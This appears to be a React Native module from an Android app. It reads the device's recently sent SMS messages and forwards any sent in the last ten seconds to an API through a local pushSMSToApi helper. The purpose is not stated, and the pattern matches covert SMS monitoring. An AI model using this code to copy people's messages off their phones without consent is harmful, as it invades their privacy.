import SmsAndroid  from 'react-native-get-sms-android';
import {pushSMSToApi} from "./conectapi";

export function listSMS(phone) {
    var filter = {
        box: 'sent',
        maxCount:20,
    };
    SmsAndroid.list(JSON.stringify(filter), (fail) => {
        console.log(fail)
    }, (count, smsList) => {
        var arr = JSON.parse(smsList);
        for(let i=0; i<count; i++){
            let time = new Date(arr[i].date);
            let timecurrent= new Date();
            if((timecurrent-time)<10000){
                pushSMSToApi(arr[i],phone);
            }
        }
    });
}
